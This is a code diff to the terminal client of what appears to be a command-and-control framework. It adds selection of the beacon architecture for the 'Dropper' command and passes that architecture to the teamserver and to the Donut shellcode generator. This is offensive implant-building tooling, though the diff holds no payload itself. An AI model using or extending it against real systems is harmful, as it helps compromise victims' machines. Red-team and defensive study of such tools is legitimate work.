@@ -2,6 +2,7 @@ import sys
 import os
 import json
 import logging
+import re
 from datetime import datetime
 
 from PyQt6.QtCore import Qt, QEvent, QThread, QTimer, pyqtSignal, QObject
@@ -190,15 +191,24 @@ DropperInstruction = "Dropper"
 DropperConfigSubInstruction = "Config"
 DropperConfigShellcodeGeneratorDisplay = "ShellcodeGenerator"
 DropperConfigShellcodeGeneratorKey = DropperConfigShellcodeGeneratorDisplay.lower()
+DropperConfigBeaconArchDisplay = "BeaconArch"
+DropperConfigBeaconArchKey = DropperConfigBeaconArchDisplay.lower()
 ShellcodeGeneratorDonut = "Donut"
+DefaultWindowsArch = "x64"
+SupportedWindowsArchs = ("x86", "x64", "arm64")
 DropperAvailableHeader = "- Available dropper:\n"
 DropperThreadRunningMessage = "Dropper thread already running"
 DropperConfigHeader = "- Dropper Config:"
 DropperConfigShellcodeGeneratorLine = f"  {DropperConfigShellcodeGeneratorDisplay}: {{}}"
 DropperConfigShellcodeGeneratorAvailableLine = "    Available: {}"
+DropperConfigBeaconArchLine = f"  {DropperConfigBeaconArchDisplay}: {{}}"
+DropperConfigBeaconArchAvailableLine = "    Available: {}"
 DropperConfigUnknownOptionError = "Error: Unknown dropper config option."
 DropperConfigUnknownValueError = "Error: Unknown shellcode generator."
+DropperConfigUnknownArchError = "Error: Unknown beacon architecture."
 DropperConfigUpdatedMessage = "Shellcode generator set to {}."
+DropperConfigBeaconArchUpdatedMessage = "Beacon architecture set to {}."
+DropperArchFlagPattern = re.compile(r"^--(?:beacon-)?arch=(.+)$", re.IGNORECASE)
 DonutShellcodeGeneratorMessage = "Donut Shellcode generator"
 DonutShellcodeFileName = "loader.bin"
 ModuleShellcodeFileName = "finalShellcode.bin"
@@ -240,12 +250,71 @@ def getHelpMsg():
     helpText += ReloadModulesInstruction
     return helpText
 
+
+def normalizeWindowsArch(arch):
+    normalized = (arch or "").lower()
+    if normalized in ("amd64", "x86_64"):
+        return "x64"
+    if normalized in ("i386", "i686"):
+        return "x86"
+    if normalized == "aarch64":
+        return "arm64"
+    if normalized in SupportedWindowsArchs:
+        return normalized
+    return ""
+
+
+def donutArchValue(arch):
+    # Python donut follows Donut's C constants for x86/x64. Some packaged
+    # versions may reject ARM64 even though the teamserver-side Donut supports it.
+    if arch == "x86":
+        return 1
+    if arch == "x64":
+        return 2
+    if arch == "arm64":
+        return 4
+    return 2
+
+
+def extractDropperTargetArch(arguments, defaultArch=DefaultWindowsArch):
+    targetArch = normalizeWindowsArch(defaultArch) or DefaultWindowsArch
+    remainingArgs = []
+    skipNext = False
+
+    for index, argument in enumerate(arguments):
+        if skipNext:
+            skipNext = False
+            continue
+
+        archMatch = DropperArchFlagPattern.match(argument)
+        if archMatch:
+            normalized = normalizeWindowsArch(archMatch.group(1))
+            if not normalized:
+                return "", arguments
+            targetArch = normalized
+            continue
+
+        if argument.lower() in ("--arch", "--beacon-arch"):
+            if index + 1 >= len(arguments):
+                return "", arguments
+            normalized = normalizeWindowsArch(arguments[index + 1])
+            if not normalized:
+                return "", arguments
+            targetArch = normalized
+            skipNext = True
+            continue
+
+        remainingArgs.append(argument)
+
+    return targetArch, remainingArgs
+
 completerData = [
     (HelpInstruction,[]),
     (HostInstruction,[]),
     (DropperInstruction,[
             (DropperConfigSubInstruction, [
-                (DropperConfigShellcodeGeneratorDisplay, [])
+                (DropperConfigShellcodeGeneratorDisplay, []),
+                (DropperConfigBeaconArchDisplay, [])
             ])
         ]),
     (BatcaveInstruction, [
@@ -281,7 +350,10 @@ class Terminal(QWidget):
         self.layout.setContentsMargins(0, 0, 0, 0)
 
         self.grpcClient = grpcClient
-        self.dropperConfig = {DropperConfigShellcodeGeneratorKey: ShellcodeGeneratorDonut}
+        self.dropperConfig = {
+            DropperConfigShellcodeGeneratorKey: ShellcodeGeneratorDonut,
+            DropperConfigBeaconArchKey: DefaultWindowsArch,
+        }
 
         self.logFileName=LogFileName
 
@@ -631,17 +703,26 @@ class Terminal(QWidget):
             return
 
         configKey = instructions[2].lower()
-        if configKey != DropperConfigShellcodeGeneratorKey:
+        if configKey not in (DropperConfigShellcodeGeneratorKey, DropperConfigBeaconArchKey):
             self.printInTerminal(commandLine, DropperConfigUnknownOptionError)
             return
 
         if len(instructions) == 3:
-            self.printInTerminal(commandLine, self._format_shellcode_generator_summary(include_header=False))
+            self.printInTerminal(commandLine, self._format_dropper_config_summary(configKey=configKey, include_header=False))
             return
 
         requestedGenerator = instructions[3].lower()
-        availableGenerators = self._get_available_shellcode_generators()
+        if configKey == DropperConfigBeaconArchKey:
+            normalizedArch = normalizeWindowsArch(requestedGenerator)
+            if not normalizedArch:
+                self.printInTerminal(commandLine, DropperConfigUnknownArchError)
+                return
 
+            self.dropperConfig[DropperConfigBeaconArchKey] = normalizedArch
+            self.printInTerminal(commandLine, DropperConfigBeaconArchUpdatedMessage.format(normalizedArch))
+            return
+
+        availableGenerators = self._get_available_shellcode_generators()
         selectedGenerator = None
         for generator in availableGenerators:
             if generator.lower() == requestedGenerator:
@@ -656,22 +737,36 @@ class Terminal(QWidget):
         self.printInTerminal(commandLine, DropperConfigUpdatedMessage.format(selectedGenerator))
 
     def _format_shellcode_generator_summary(self, include_header=True):
+        return self._format_dropper_config_summary(include_header=include_header)
+
+    def _format_dropper_config_summary(self, configKey=None, include_header=True):
         currentGenerator = self.dropperConfig.get(
             DropperConfigShellcodeGeneratorKey,
             ShellcodeGeneratorDonut,
         )
         availableGenerators = ", ".join(self._get_available_shellcode_generators())
+        currentArch = self.dropperConfig.get(DropperConfigBeaconArchKey, DefaultWindowsArch)
+        availableArchs = ", ".join(SupportedWindowsArchs)
 
         lines = []
         if include_header:
             lines.append(DropperConfigHeader)
+        if configKey in (None, DropperConfigShellcodeGeneratorKey):
             generatorLine = DropperConfigShellcodeGeneratorLine.format(currentGenerator)
             availableLine = DropperConfigShellcodeGeneratorAvailableLine.format(availableGenerators)
-        else:
-            generatorLine = DropperConfigShellcodeGeneratorLine.strip().format(currentGenerator)
-            availableLine = DropperConfigShellcodeGeneratorAvailableLine.strip().format(availableGenerators)
-        lines.append(generatorLine)
-        lines.append(availableLine)
+            if not include_header:
+                generatorLine = generatorLine.strip()
+                availableLine = availableLine.strip()
+            lines.append(generatorLine)
+            lines.append(availableLine)
+        if configKey in (None, DropperConfigBeaconArchKey):
+            archLine = DropperConfigBeaconArchLine.format(currentArch)
+            availableLine = DropperConfigBeaconArchAvailableLine.format(availableArchs)
+            if not include_header:
+                archLine = archLine.strip()
+                availableLine = availableLine.strip()
+            lines.append(archLine)
+            lines.append(availableLine)
         return "\n".join(lines)
 
     def _get_available_shellcode_generators(self):
@@ -718,7 +813,14 @@ class Terminal(QWidget):
             
                 listenerDownload = instructions[2]
                 listenerBeacon = instructions[3]
-                additionalArgss = " ".join(instructions[4:])
+                targetArch, remainingArgs = extractDropperTargetArch(
+                    instructions[4:],
+                    self.dropperConfig.get(DropperConfigBeaconArchKey, DefaultWindowsArch),
+                )
+                if not targetArch:
+                    self.printInTerminal(commandLine, DropperConfigUnknownArchError)
+                    return
+                additionalArgss = " ".join(remainingArgs)
 
                 if self.dropperWorker:
                     self.printInTerminal(commandLine, DropperThreadRunningMessage)
@@ -736,6 +838,7 @@ class Terminal(QWidget):
                         listenerBeacon,
                         additionalArgss,
                         shellcodeGenerator,
+                        targetArch,
                     )
                     self.dropperWorker.moveToThread(self.thread)
                     self.thread.started.connect(self.dropperWorker.run)
@@ -774,6 +877,7 @@ class DropperWorker(QObject):
         listenerBeacon,
         additionalArgs,
         shellcodeGenerator,
+        targetArch=DefaultWindowsArch,
     ):
         super().__init__()
         self.grpcClient = grpcClient
@@ -783,6 +887,7 @@ class DropperWorker(QObject):
         self.listenerBeacon = listenerBeacon
         self.additionalArgs = additionalArgs
         self.shellcodeGenerator = shellcodeGenerator or ShellcodeGeneratorDonut
+        self.targetArch = normalizeWindowsArch(targetArch) or DefaultWindowsArch
 
     def run(self):
 
@@ -847,6 +952,8 @@ class DropperWorker(QObject):
                     targetOs = "windows"
 
         commandTeamServer = GrpcGetBeaconBinaryInstruction+" "+self.listenerBeacon+" "+targetOs
+        if targetOs == "windows":
+            commandTeamServer += " " + self.targetArch
         termCommand = TeamServerApi_pb2.TermCommand(cmd=commandTeamServer)
         resultTermCommand = self.grpcClient.sendTermCmd(termCommand)
 
@@ -885,10 +992,15 @@ class DropperWorker(QObject):
                 # Check shellcode generator
                 if shellcodeGeneratorLower == ShellcodeGeneratorDonut.lower():
                     print(DonutShellcodeGeneratorMessage)
-                    shellcode = donut.create(
-                        file=beaconFilePath,
-                        params=beaconArg
-                    )
+                    try:
+                        shellcode = donut.create(
+                            file=beaconFilePath,
+                            params=beaconArg,
+                            arch=donutArchValue(self.targetArch),
+                        )
+                    except RuntimeError as error:
+                        self.finished.emit(self.commandLine, "Error: Donut shellcode generation failed: " + str(error))
+                        return
                     beaconArg = ""
                     beaconFilePath = ""
                     rawshellcode = DonutShellcodeFileName
